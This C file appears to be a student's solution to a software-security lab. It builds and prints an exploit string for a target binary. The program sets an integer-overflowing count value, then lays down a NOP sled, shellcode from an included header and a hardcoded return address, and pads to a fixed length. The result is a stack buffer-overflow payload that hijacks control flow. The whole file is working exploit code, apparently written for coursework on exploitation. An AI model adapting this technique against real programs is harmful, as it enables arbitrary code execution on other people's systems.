#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"
#include <math.h>

/*
 * Construct your exploit string in the main function and print it.
 * You can pass it into a target binary <target> by running"<target> $(sploit)"
 * in your terminal.
 */

typedef unsigned int uint_t;

#define RET_OFFSETT 4804

int main(void)
{
  int N = 4830, n = strlen(shellcode);

  char* exploit = (char*) malloc((N+1)*(sizeof(char)));

  uint_t count = (uint_t)(1 << 31) + 241;

  sprintf(exploit, "%u,", count);

  char* nop = (char*) malloc((RET_OFFSETT-n+1)*sizeof(char));

  for (int i=0; i<RET_OFFSETT-n; i++)
    nop[i] = NOP;
  nop[RET_OFFSETT-n] = '\0';

  strcat(exploit, nop);
  strcat(exploit, shellcode);

  char* ret_address = "\xf0\xe2\x7f\x40";

  strcat(exploit, ret_address);

  for (int i=strlen(exploit); i<N; i++)
    exploit[i] = 'A';
  exploit[N] = '\0';

  printf("%s", exploit);

  free(exploit);
  free(nop);

  return 0;
}
